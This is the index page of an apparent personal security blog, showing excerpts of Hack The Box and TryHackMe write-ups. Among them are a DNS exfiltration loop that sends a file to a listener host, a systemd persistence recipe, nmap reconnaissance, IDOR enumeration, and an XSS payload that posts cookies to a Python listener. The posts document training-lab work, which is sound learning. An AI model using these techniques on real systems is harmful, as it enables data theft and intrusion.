@@ -1,0 +1,743 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>zerrox&#39; security blog</title>
+  <meta name="author" content="zerrox9">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="zerrox&#39; security blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/project/atom.xml" title="zerrox&#39; security blog" type="application/atom+xml">
+  
+  
+    <link href="/project/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/project/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/project/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/project/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/project/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/project/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/project/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/project/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/project/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/project/">zerrox&#39; security blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/project/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 <div class="page-header logo">
+  <h1>zerrox&#39; security blog<span class="blink-fast">|</span></h1>
+</div>
+
+<div class="row page">
+
+	
+	<div class="col-md-9">
+	
+
+		<div class="slogan">
+
+
+		<i class="fa fa-heart blink-slow"></i>
+
+		Give me somethin&#39; to break ~ Limp Bizkit
+
+</div>    
+
+		<div id="top_search"></div>
+		<div class="mypage">
+		
+		<!-- title and entry -->
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/project/2026/07/16/2026-07-16-reversing/" title="A documentation of my early steps learning to reverse engineer">HackTheBox - Cyberpsychosis (Easy)</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2026-07-16  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p>The challenge was simple on paper: disarm a Linux kernel module rootkit and recover hidden data. In practice, this was my first Hack The Box challenge, and until now I had mostly played with crackmes. Getting an IP address and port as part of a reversing challenge already threw me off for a moment.</p>
+<p>The provided file was <code>diamorphine.ko</code>. A <code>.ko</code> file is a Linux kernel object: it can be loaded with <code>insmod</code>, removed with <code>rmmod</code>, and listed with <code>lsmod</code> if the module is not hiding itself.</p>
+<p><code>file</code> identified it as:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELF 64-bit LSB relocatable, x86-64, with debug_info, not stripped</span><br></pre></td></tr></table></figure>
+
+<p>That last part mattered. Because the module was not stripped, Ghidra still showed useful function names instead of leaving me with anonymous blobs. <code>strings</code> produced too much noise to be helpful, so I moved into Ghidra and started from the symbol tree.</p>
+<p>The interesting functions were:</p>
+<ul>
+<li>diamorphine_init</li>
+<li>diamorphine_cleanup</li>
+<li>find_task</li>
+<li>get_syscall_table_bf</li>
+<li>give_root</li>
+<li>hacked_getdents</li>
+<li>hacked_getdents64</li>
+<li>hacked_kill</li>
+<li>is_invisible</li>
+<li>module_hide</li>
+<li>module_show</li>
+</ul>
+<p>Every kernel module has an initialization and cleanup path, which in this case were <code>diamorphine_init</code> and <code>diamorphine_cleanup</code>. The rest of the names were already a pretty good map of the rootkit:</p>
+<ul>
+<li><code>module_hide</code> and <code>module_show</code> remove or restore the module from the kernel’s module list, which is why <code>lsmod</code> may not show it.</li>
+<li><code>give_root</code> does exactly what the name suggests.</li>
+<li><code>get_syscall_table_bf</code> locates the syscall table by brute force.</li>
+<li><code>is_invisible</code> checks whether a process has been marked as hidden.</li>
+</ul>
+<p>From there, the two most important hooks were <code>hacked_kill</code> and <code>hacked_getdents64</code>.</p>
+	
+	</div>
+  <a type="button" href="/project/2026/07/16/2026-07-16-reversing/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/project/2026/07/13/2026-07-13-dns-data-exfil/" title="A short showcase of how DNS can be abused as a data exfiltration channel.">Data Exfiltration by Abusing DNS</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2026-07-13  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="Data-Exfiltration-by-Abusing-DNS"><a href="#Data-Exfiltration-by-Abusing-DNS" class="headerlink" title="Data Exfiltration by Abusing DNS"></a>Data Exfiltration by Abusing DNS</h1><h3 id="This-was-BreachLab’s-Phantom-The-Heist"><a href="#This-was-BreachLab’s-Phantom-The-Heist" class="headerlink" title="This was BreachLab’s Phantom The Heist"></a>This was BreachLab’s <a target="_blank" rel="noopener" href="https://breachlab.org/">Phantom The Heist</a></h3><p>DNS is easy to overlook during a compromise. It is usually allowed out of a network, it is noisy by nature, and many environments focus harder on HTTP, SSH, or obvious file transfer tools. That makes it a useful channel for moving small amounts of data when a host can resolve external names.</p>
+<p>In this lab example, the target file was:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/vault/classified.db</span><br></pre></td></tr></table></figure>
+
+<p>The exfiltration command was:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i=0</span><br><span class="line"><span class="built_in">base32</span> -w0 /opt/vault/classified.db | <span class="built_in">tr</span> -d <span class="string">&#x27;=&#x27;</span> | <span class="built_in">tr</span> <span class="string">&#x27;A-Z&#x27;</span> <span class="string">&#x27;a-z&#x27;</span> | <span class="built_in">fold</span> -w32 | <span class="keyword">while</span> <span class="built_in">read</span> -r chunk; <span class="keyword">do</span></span><br><span class="line">    dig @10.13.37.30 <span class="string">&quot;<span class="variable">$&#123;chunk&#125;</span>.<span class="variable">$&#123;i&#125;</span>.123.exfil.local&quot;</span> A</span><br><span class="line">    i=$((i+<span class="number">1</span>))</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="How-It-Worked"><a href="#How-It-Worked" class="headerlink" title="How It Worked"></a>How It Worked</h2><p>The important trick is that DNS names can carry attacker-controlled text. Instead of sending the file directly over HTTP or copying it with <code>scp</code>, the file is encoded and placed into DNS query labels.</p>
+<p>This part reads the file and converts it to DNS-safe text:</p>
+	
+	</div>
+  <a type="button" href="/project/2026/07/13/2026-07-13-dns-data-exfil/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/project/2026/06/27/2026-06-27-abusing-system-services/" title="A short showcase of user-level persistence through systemd user services on a Linux host.">Persistence by Abusing systemd Services</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2026-06-27  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="Persistence-by-Abusing-systemd-Services"><a href="#Persistence-by-Abusing-systemd-Services" class="headerlink" title="Persistence by Abusing systemd Services"></a>Persistence by Abusing systemd Services</h1><p>User-level systemd services live in:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/.config/systemd/user/</span><br></pre></td></tr></table></figure>
+
+<p>If the directory does not exist yet, create it first:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p ~/.config/systemd/user</span><br></pre></td></tr></table></figure>
+
+<p>Create a user service file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi ~/.config/systemd/user/persistence.service</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=Persistence service</span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">Type</span>=<span class="literal">on</span>eshot</span><br><span class="line"><span class="attr">ExecStart</span>=/bin/bash -c <span class="string">&#x27;echo pwned&#x27;</span></span><br><span class="line"><span class="attr">RemainAfterExit</span>=<span class="literal">yes</span></span><br><span class="line"></span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=default.target</span><br></pre></td></tr></table></figure>
+
+<p>Reload the user systemd manager and enable the service:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl --user daemon-reload</span><br><span class="line">systemctl --user <span class="built_in">enable</span> persistence.service</span><br></pre></td></tr></table></figure>
+	
+	</div>
+  <a type="button" href="/project/2026/06/27/2026-06-27-abusing-system-services/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/project/2026/06/04/2026-06-04-silentium/" title="Writeup for Silentium CTF.">Silentium - CTF Writeup</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2026-06-04  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="Silentium-CTF-Writeup"><a href="#Silentium-CTF-Writeup" class="headerlink" title="Silentium - CTF Writeup"></a>Silentium - CTF Writeup</h1><h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>A full TCP scan exposed SSH and an nginx web server. The web server redirected to the virtual host <code>silentium.htb</code>.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -sS -sV -p- 10.129.9.0</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Version</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>22/tcp</code></td>
+<td>SSH</td>
+<td>OpenSSH 9.6p1 Ubuntu 3ubuntu13.15</td>
+<td>Ubuntu host</td>
+</tr>
+<tr>
+<td><code>80/tcp</code></td>
+<td>HTTP</td>
+<td>nginx 1.24.0</td>
+<td>Redirects to <code>silentium.htb</code></td>
+</tr>
+</tbody></table>
+<p>Virtual host enumeration revealed another application:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">staging.silentium.htb</span><br></pre></td></tr></table></figure>
+
+<h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>The password reset flow on the staging host returned a useful backend error:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transaction is not started yet, start transaction before commiting or rolling it back</span><br></pre></td></tr></table></figure>
+	
+	</div>
+  <a type="button" href="/project/2026/06/04/2026-06-04-silentium/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/project/2026/05/31/2026-05-31-principal/" title="Writeup for Principal CTF.">Principal - CTF Writeup</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2026-05-31  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="Principal-CTF-Writeup"><a href="#Principal-CTF-Writeup" class="headerlink" title="Principal - CTF Writeup"></a>Principal - CTF Writeup</h1><h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>The initial port scan showed only two exposed services: SSH and a Jetty-based web application on port <code>8080</code>.</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-28 09:52 -0400</span><br><span class="line">Nmap scan report for 10.129.244.220</span><br><span class="line">Host is up (0.012s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">8080/tcp open  http-proxy Jetty</span><br></pre></td></tr></table></figure>
+
+<p>The HTTP service redirected to <code>/login</code> and exposed an interesting application header:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Jetty</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>pac4j-jwt/6.0.3</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>/login</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>22/tcp</code></td>
+<td>SSH</td>
+<td>OpenSSH 9.6p1 on Ubuntu</td>
+</tr>
+<tr>
+<td><code>8080/tcp</code></td>
+<td>HTTP &#x2F; Jetty</td>
+<td>Login page with <code>pac4j-jwt/6.0.3</code> header</td>
+</tr>
+</tbody></table>
+<h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>After checking the visible application and finding no obvious path forward, the <code>X-Powered-By</code> header became the main lead:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Powered-By: pac4j-jwt/6.0.3</span><br></pre></td></tr></table></figure>
+	
+	</div>
+  <a type="button" href="/project/2026/05/31/2026-05-31-principal/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/project/2026/05/08/2026-05-08-Web-Attacks-Skill-Assessment/" title="Writeup for HTB Web-Attacks Skill Assessment.">Web Attacks - Writeup</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2026-05-08  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="Web-Attacks-—-Skill-Assessment-Writeup"><a href="#Web-Attacks-—-Skill-Assessment-Writeup" class="headerlink" title="Web Attacks — Skill Assessment Writeup"></a>Web Attacks — Skill Assessment Writeup</h1><h2 id="Step-1-IDOR-—-User-Enumeration"><a href="#Step-1-IDOR-—-User-Enumeration" class="headerlink" title="Step 1: IDOR — User Enumeration"></a>Step 1: IDOR — User Enumeration</h2><p>The application manages sessions using a <code>uid</code> cookie. Modifying this value allows impersonating other users.</p>
+<p>While browsing profiles, an API call fetches user data via a URL parameter:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/user?id=52</span><br></pre></td></tr></table></figure>
+
+<p>Using Burp Suite Intruder (Battering Ram) to enumerate user IDs and filtering responses for <code>Administrator</code> with <code>grep</code>:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;uid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;52&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;a.corrales&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;full_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Amor Corrales&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;company&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Administrator&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Step-2-Understand-the-password-reset-flow"><a href="#Step-2-Understand-the-password-reset-flow" class="headerlink" title="Step 2: Understand the password-reset flow"></a>Step 2: Understand the password-reset flow</h2><p>The password reset function calls two endpoints:</p>
+	
+	</div>
+  <a type="button" href="/project/2026/05/08/2026-05-08-Web-Attacks-Skill-Assessment/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/project/2026/05/04/2026-05-04-CupCTF/" title="Writeup for Cup CTF.">Cup - CTF Writeup</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2026-05-04  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="CTF-Writeup-—-HTB-Machine-10-129-48-150"><a href="#CTF-Writeup-—-HTB-Machine-10-129-48-150" class="headerlink" title="CTF Writeup — HTB Machine (10.129.48.150)"></a>CTF Writeup — HTB Machine (10.129.48.150)</h1><hr>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>A full port scan was conducted against the target to enumerate open services.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -sS -sV -p- 10.129.48.150</span><br></pre></td></tr></table></figure>
+
+<p><strong>Results:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>State</th>
+<th>Service</th>
+<th>Version</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>21&#x2F;tcp</td>
+<td>open</td>
+<td>ftp</td>
+<td>vsftpd 3.0.3</td>
+</tr>
+<tr>
+<td>22&#x2F;tcp</td>
+<td>open</td>
+<td>ssh</td>
+<td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.2</td>
+</tr>
+<tr>
+<td>80&#x2F;tcp</td>
+<td>open</td>
+<td>http</td>
+<td>Gunicorn (Security Dashboard)</td>
+</tr>
+</tbody></table>
+<p>The target is running Linux 5.0–5.14, reachable via 2 hops (RTT ~11ms).</p>
+<hr>
+<h2 id="Web-Enumeration-—-IDOR"><a href="#Web-Enumeration-—-IDOR" class="headerlink" title="Web Enumeration — IDOR"></a>Web Enumeration — IDOR</h2>
+	
+	</div>
+  <a type="button" href="/project/2026/05/04/2026-05-04-CupCTF/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/project/2026/05/02/2026-05-02-Cupids-matchmaker/" title="Writeup for Cupid&#39;s matchmaker.">Cupid&#39;s matchmaker - CTF Writeup</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2026-05-02  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p>After inspecting the site, one small detail in the Survey stood out:<br><em><strong>Our team reads every word! Be creative and specific.</strong></em><br>when reading this i instantly thought about XSS.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;  </span><br><span class="line">fetch(&#x27;http://localhost:8000&#x27;, &#123;  </span><br><span class="line">method: &#x27;POST&#x27;,  </span><br><span class="line">mode: &#x27;no-cors&#x27;,  </span><br><span class="line">body:document.cookie  </span><br><span class="line">&#125;);  </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>this is a very simple payload which requires the site to have no real input validation.<br>I set up a python3 webserver using the following code:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from http.server import HTTPServer, SimpleHTTPRequestHandler</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">class PostHandler(SimpleHTTPRequestHandler):</span><br><span class="line">    def do_POST(self):</span><br><span class="line">        content_length = int(self.headers[&#x27;Content-Length&#x27;])</span><br><span class="line">        post_data = self.rfile.read(content_length)</span><br><span class="line">        </span><br><span class="line">        # Log the POST data</span><br><span class="line">        print(f&quot;POST request received:&quot;)</span><br><span class="line">        print(f&quot;Path: &#123;self.path&#125;&quot;)</span><br><span class="line">        print(f&quot;Headers: &#123;self.headers&#125;&quot;)</span><br><span class="line">        print(f&quot;Body: &#123;post_data.decode(&#x27;utf-8&#x27;)&#125;&quot;)</span><br><span class="line">        </span><br><span class="line">        # Send response</span><br><span class="line">        self.send_response(200)</span><br><span class="line">        self.send_header(&#x27;Content-type&#x27;, &#x27;application/json&#x27;)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        </span><br><span class="line">        response = &#123;&#x27;status&#x27;: &#x27;success&#x27;, &#x27;received&#x27;: post_data.decode(&#x27;utf-8&#x27;)&#125;</span><br><span class="line">        self.wfile.write(json.dumps(response).encode())</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    server = HTTPServer((&#x27;localhost&#x27;, 8000), PostHandler)</span><br><span class="line">    print(&#x27;Server running on http://localhost:8000&#x27;)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>to get the flag all i had to do is start the webserver by running: <em><strong>python3 server.py</strong></em><br>and sent the payload via the survey.</p>
+<p>at the end i got the flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Body: flag=THM&#123;XSS_CuP1d_Str1k3s_Ag41n&#125;</span><br><span class="line">10.66.169.156 - - [15/Feb/2026 09:45:15] &quot;POST / HTTP/1.1&quot; 200 -</span><br><span class="line">POST request received:</span><br><span class="line">Path: /</span><br><span class="line">Headers: Host: 192.168.134.175:8000</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 33</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/144.0.0.0 Safari/537.36</span><br><span class="line">Content-Type: text/plain;charset=UTF-8</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://localhost:5000</span><br><span class="line">Referer: http://localhost:5000/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.</span><br></pre></td></tr></table></figure>
+
+	
+	</div>
+  <a type="button" href="/project/2026/05/02/2026-05-02-Cupids-matchmaker/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/project/2026/05/01/2026-05-01-welcome-hackthebox/" title="A starter post for Hack The Box notes and writeups.">Welcome to Hack The Box Notes</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2026-05-01  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p>This category is for my <strong>Hack The Box</strong> notes, machine writeups, and training progress.</p>
+<p>Future posts here can include box walkthroughs, enumeration notes, and lessons learned.</p>
+
+	
+	</div>
+  <a type="button" href="/project/2026/05/01/2026-05-01-welcome-hackthebox/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/project/2026/05/01/2026-05-01-welcome/" title="A starter post for TryHackMe-related writeups and notes.">Welcome to TryHackMe Notes</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2026-05-01  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p>This category is for my <strong>TryHackMe</strong> notes, walkthroughs, and learning progress.</p>
+<p>Future posts here can include room notes, takeaways, and short writeups.</p>
+
+	
+	</div>
+  <a type="button" href="/project/2026/05/01/2026-05-01-welcome/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+
+		</div>
+
+		<!-- pagination -->
+		<div>
+  		<center>
+		<div class="pagination">
+
+   
+    
+           <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+        
+
+        <a href="/project/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+ 
+       <a href="/project/page/2/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
+        
+
+  
+</div>
+
+  		</center>
+		</div>
+
+		
+		
+	</div> <!-- col-md-9 -->
+
+	
+		<div class="col-md-3">
+	<div id="sidebar">
+	
+			
+  <div id="site_search">
+   <div class="form-group">
+    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
+   </div>  
+  <div id="local-search-result"></div>
+  </div>
+
+
+		
+			
+	<div class="widget">
+		<h4>Categories</h4>
+		<ul class="tag_box inline list-unstyled">
+		
+			<li><a href="/project/categories/hackthebox/">hackthebox<span>6</span></a></li>
+		
+			<li><a href="/project/categories/portswigger/">portswigger<span>1</span></a></li>
+		
+			<li><a href="/project/categories/security/">security<span>2</span></a></li>
+		
+			<li><a href="/project/categories/tryhackme/">tryhackme<span>2</span></a></li>
+		
+		</ul>
+	</div>
+
+		
+			
+	<div class="widget">
+		<h4>Tag Cloud</h4>
+		<ul class="tag_box inline list-unstyled">		
+		
+			<li><a href="/project/tags/labs/">labs<span>1</span></a></li>
+		
+			<li><a href="/project/tags/hackthebox/">hackthebox<span>6</span></a></li>
+		
+			<li><a href="/project/tags/portswigger/">portswigger<span>1</span></a></li>
+		
+			<li><a href="/project/tags/reversing/">reversing<span>1</span></a></li>
+		
+			<li><a href="/project/tags/security/">security<span>2</span></a></li>
+		
